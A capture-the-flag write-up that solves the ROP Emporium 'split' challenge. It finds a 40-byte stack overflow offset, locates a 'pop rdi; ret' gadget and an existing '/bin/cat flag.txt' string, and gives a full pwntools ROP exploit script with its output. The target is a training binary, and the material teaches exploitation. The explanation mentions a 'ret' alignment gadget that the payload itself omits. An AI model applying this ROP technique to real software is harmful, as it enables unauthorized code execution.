# Split - ROP Emporium Challenge Writeup

## Challenge Description

**Binary:** `split` (64-bit ELF)
**Difficulty:** Easy/Intermediate
**Category:** Binary Exploitation / Return-Oriented Programming (ROP)

We have a binary that is vulnerable to a buffer overflow. Our goal is to read the `flag.txt` file by calling `system("/bin/cat flag.txt")`.

---

## Initial Analysis

### File Information

```bash
$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped

$ checksec --file=split
[*] '/home/kali/revers/personelle/fun/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**Key observations:**
- **No stack canary** → Buffer overflow possible
- **NX enabled** → Can't execute shellcode on stack (need ROP)
- **No PIE** → Memory addresses are fixed, making ROP easier
- **Not stripped** → Function names are preserved

---

## Finding the Vulnerability

### Crashing the Program

Let's find the buffer overflow offset using `cyclic`:

```bash
$ pwndbg ./split
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/kali/revers/personelle/fun/split
...
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400741 in pwnme ()
```

The program crashes. Let's find the exact offset:

```bash
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

**Offset = 40 bytes** before we control the return address.

---

## Reverse Engineering

### Analyzing with radare2

```bash
$ r2 -A split
```

#### Main Function

```
[0x004005b0]> s main
[0x00400697]> pdd

int32_t main (void) {
    setvbuf(stdout, 0, 2, 0);
    puts("split by ROP Emporium");
    puts("x86_64\n");
    pwnme();
    puts("\nExiting");
    return 0;
}
```

Nothing special here - just calls `pwnme()`.

#### pwnme Function (The Vulnerable One)

```
[0x004005b0]> s sym.pwnme
[0x004006e8]> pdd

uint64_t pwnme (void) {
    void *buf;
    buf = rbp - 0x20;
    memset(buf, 0, 0x20);
    puts("Contriving a reason to ask user for data...");
    printf("\n> ");
    read(0, buf, 0x60);  // ← VULNERABILITY HERE!
    puts("Thank you!");
    return rax;
}
```

**The vulnerability:** `read(0, buf, 0x60)` reads 96 bytes into a buffer that's only 32 bytes (0x20) on the stack! This gives us a 64-byte overflow (96 - 32 = 64), more than enough for a ROP chain.

#### usefulFunction (Our Target)

```
[0x004005b0]> s sym.usefulFunction
[0x00400742]> pdd

void usefulFunction (void) {
    system("/bin/ls");
}
```

This function calls `system("/bin/ls")` - perfect! We just need to change the argument to `"/bin/cat flag.txt"`.

---

## Finding the Right String

### Looking for Strings

```bash
$ r2 -A split
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
6   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

**Bingo!** There's already a string `"/bin/cat flag.txt"` in the `.data` section at address **0x00601060**!

---

## Finding ROP Gadgets

We need to control the first argument to `system()` - in x86-64 Linux, the first argument goes in **RDI**.

### Looking for `pop rdi; ret`

```bash
$ ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
```

Perfect! We have a gadget at **0x4007c3**.

### System Function Address

```bash
$ objdump -d split | grep system
0000000000400560 <system@plt>:
```

`system()` is at **0x400560** (PLT entry).

---

## Building the Exploit

### ROP Chain Logic

1. **Padding**: 40 bytes to reach the return address
2. **Gadget**: `pop rdi; ret` (0x4007c3) - pops our string address into RDI
3. **Argument**: Address of `"/bin/cat flag.txt"` (0x00601060)
4. **Function**: `system@plt` (0x400560)

Visual representation of the stack after overflow:

```
[ Buffer (32 bytes) ]
[ Saved RBP (8 bytes) ] ← 40 bytes total padding
[ Return address      ] ← We control this!
```

After our ROP chain:

```
Return address → pop rdi; ret (0x4007c3)
Next 8 bytes  → string address (0x00601060)
Next 8 bytes  → system@plt (0x400560)
```

When `pwnme()` returns, it will:
1. Jump to `pop rdi; ret` - this pops our string address into RDI
2. The `ret` then jumps to `system@plt`
3. `system()` is called with RDI pointing to `"/bin/cat flag.txt"`

### Final Exploit Script

```python
#!/usr/bin/env python3
# exploit.py - Split ROP Emporium Challenge

from pwn import *

# Set up the binary context
context.binary = './split'
context.log_level = 'info'

# Addresses we found
pop_rdi = 0x4007c3           # pop rdi; ret gadget
string_cat = 0x00601060       # "/bin/cat flag.txt" in .data
system_plt = 0x400560         # system@plt

# Build the payload
payload = flat([
    b'A' * 40,                # Padding to reach return address
    pop_rdi,                  # pop rdi; ret
    string_cat,               # address of "/bin/cat flag.txt"
    system_plt                # call system()
])

# Launch the process
p = process('./split')

# Receive until the prompt
p.recvuntil(b'> ')

# Send the payload
p.send(payload)

# Get the flag!
p.interactive()
```

---

## Running the Exploit

```bash
$ python3 exploit.py
[*] '/home/kali/revers/personelle/fun/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process './split': pid 4254
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> $ 
```

**Flag obtained: `ROPE{a_placeholder_32byte_flag!}`** 🎉

---

## Why This Works

1. **Buffer Overflow**: `read()` reads 96 bytes into a 32-byte buffer, overwriting the return address
2. **ROP (Return-Oriented Programming)**: Since NX is enabled, we can't execute shellcode on the stack. Instead, we chain together existing code snippets ("gadgets") that end with `ret`
3. **Gadget**: `pop rdi; ret` loads our string address into the first argument register
4. **ret** : According to the System V AMD64 ABI (the standard calling convention for x86-64 Linux systems), when calling a function, we must ensure the stack is properly aligned. The convention states that just before a call instruction, the stack must be aligned to a 16-byte boundary.
5. **PLT**: We call `system()` via its PLT entry, which works even with ASLR (partial)
6. **Existing String**: The binary conveniently contains `"/bin/cat flag.txt"` in `.data`


**Happy Hacking!** 🚀
